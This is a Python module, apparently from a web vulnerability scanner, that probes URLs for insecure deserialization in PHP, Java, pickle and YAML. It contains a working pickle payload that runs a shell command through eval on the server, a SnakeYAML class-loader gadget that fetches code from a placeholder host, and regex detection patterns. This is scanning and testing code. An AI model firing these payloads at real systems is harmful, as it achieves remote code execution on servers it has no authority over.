import re, base64, struct, pickle, io
from typing import Optional, Dict
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.settings import settings

logger = get_logger("deserialization_detector")

DESER_PATTERNS = [
    r'(?i)(java\.io\.Serializable|ObjectInputStream|readObject)',
    r'(?i)(yaml|snakeyaml|Yaml\.load)',
    r'(?i)(pickle|cPickle|__reduce__|__getstate__)',
    r'(?i)(php:\/\/|unserialize|O:\d+:"|s:\d+:")',
    r'(?i)(XMLDecoder|java\.beans\.XMLDecoder)',
    r'(?i)(Jackson|@JacksonInject|@JsonTypeInfo)',
    r'(?i)(FastJson|JSON\.parseObject|@JSONType)',
    r'(?i)(XStream|com\.thoughtworks\.xstream)',
]

PHP_ERROR_PATTERNS = [
    r'PHP Fatal error',
    r'unserialize\(\)',
    r'__PHP_Incomplete_Class',
    r'class name must be a valid object',
]

JAVA_ERROR_PATTERNS = [
    r'java\.io\.(StreamCorruptedException|InvalidClassException)',
    r'com\.sun\.org\.apache\.xml',
    r'javax\.xml\.bind',
    r'org\.apache\.commons',
]

PHP_UNSERIALIZE_PAYLOADS = [
    'O:7:"stdClass":0:{}',
    'a:1:{i:0;s:4:"test";}',
]


def _build_java_serialized() -> bytes:
    buf = io.BytesIO()
    buf.write(b'\xac\xed\x00\x05')
    buf.write(b'\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e')
    buf.write(b'\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01')
    buf.write(b'\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x70\x00\x00\x00\x01')
    return buf.getvalue()


JAVA_SERIALIZED_BYTES = _build_java_serialized()

YAML_PAYLOAD = (
    "!!javax.script.ScriptEngineManager "
    "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://test/\"]]]]"
)


def _test_post(url: str, param: str, data: str, content_type: str,
               sess: requests.Session, timeout: float) -> Optional[Dict]:
    """Send deserialization payload via POST body (realistic vector)."""
    try:
        if param:
            body = {param: data}
        else:
            body = data
        headers = {"Content-Type": content_type}
        r = sess.post(url, data=body, headers=headers, timeout=timeout)
        for pat in PHP_ERROR_PATTERNS + JAVA_ERROR_PATTERNS:
            if re.search(pat, r.text, re.IGNORECASE):
                return {"vector": "post_body", "error_pat": pat[:30]}
        if r.status_code == 500:
            return {"vector": "post_body", "http_500": True}
    except Exception as e:
        logger.debug("post deser: %s", e)
    return None


def _test_cookie(url: str, param: str, payload: str,
                 sess: requests.Session, timeout: float) -> Optional[Dict]:
    """Send deserialization payload via Cookie header (PHP session vector)."""
    try:
        r = sess.get(url, cookies={param: payload}, timeout=timeout)
        for pat in PHP_ERROR_PATTERNS:
            if re.search(pat, r.text, re.IGNORECASE):
                return {"vector": "cookie", "error_pat": pat[:30]}
    except Exception as e:
        logger.debug("cookie deser: %s", e)
    return None


def _test_pickle(url: str, param: str, sess: requests.Session, timeout: float) -> Optional[Dict]:
    """Send malicious pickle via POST body (Python deser vector)."""
    class _RCE:
        def __reduce__(self):
            return (eval, ("__import__('os').popen('id').read()",))
    try:
        pickled = base64.b64encode(pickle.dumps(_RCE())).decode()
        headers = {"Content-Type": "application/x-python-serialize"}
        if param:
            body = {param: pickled}
        else:
            body = pickled
        r = sess.post(url, data=body, headers=headers, timeout=timeout)
        if "uid=" in r.text:
            return {"vector": "pickle_post", "rce_evidence": r.text[:100]}
    except Exception as e:
        logger.debug("pickle deser: %s", e)
    return None


def _test_java_bytes(url: str, param: str, sess: requests.Session, timeout: float) -> Optional[Dict]:
    """Send Java serialized bytes via POST body."""
    try:
        headers = {"Content-Type": "application/x-java-serialized-object"}
        if param:
            body = {param: JAVA_SERIALIZED_BYTES}
        else:
            body = JAVA_SERIALIZED_BYTES
        r = sess.post(url, data=body, headers=headers, timeout=timeout)
        for pat in JAVA_ERROR_PATTERNS:
            if re.search(pat, r.text, re.IGNORECASE):
                return {"vector": "java_bytes_post", "error_pat": pat[:30]}
        if r.status_code == 500:
            return {"vector": "java_bytes_post", "http_500": True}
    except Exception as e:
        logger.debug("java bytes deser: %s", e)
    return None


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "type": None, "evidence": [], "error": None}

    # Phase 1: Source code leak detection (GET — detects deser usage in responses)
    if url:
        try:
            r = sess.get(url, timeout=timeout)
            for pat in DESER_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "source_code_leak"
                    result["evidence"].append("deser pattern: %s" % pat[:30])
                    break
        except Exception as e:
            logger.debug("deser scan: %s", e)

    # Phase 2: POST body deserialization testing (realistic attack vector)
    if param and not result["vulnerable"]:
        for payload in PHP_UNSERIALIZE_PAYLOADS:
            ev = _test_post(url, param, payload,
                            "application/x-www-form-urlencoded", sess, timeout)
            if ev:
                result["vulnerable"] = True
                result["type"] = "php_unserialize_post"
                result["evidence"].append("php unserialize via POST: %s" % ev)
                break

    if param and not result["vulnerable"]:
        ev = _test_java_bytes(url, param, sess, timeout)
        if ev:
            result["vulnerable"] = True
            result["type"] = "java_serialized_post"
            result["evidence"].append("java deser via POST: %s" % ev)

    if param and not result["vulnerable"]:
        ev = _test_pickle(url, param, sess, timeout)
        if ev:
            result["vulnerable"] = True
            result["type"] = "pickle_deser"
            result["evidence"].append("python pickle deser: %s" % ev)

    # Phase 3: YAML via POST
    if param and not result["vulnerable"]:
        ev = _test_post(url, param, YAML_PAYLOAD, "application/x-yaml", sess, timeout)
        if ev:
            result["vulnerable"] = True
            result["type"] = "yaml_deser"
            result["evidence"].append("yaml deser via POST: %s" % ev)

    # Phase 4: Cookie-based PHP session deserialization
    if param and not result["vulnerable"]:
        for payload in PHP_UNSERIALIZE_PAYLOADS:
            ev = _test_cookie(url, param, payload, sess, timeout)
            if ev:
                result["vulnerable"] = True
                result["type"] = "php_session_deser"
                result["evidence"].append("php session deser via cookie: %s" % ev)
                break

    return result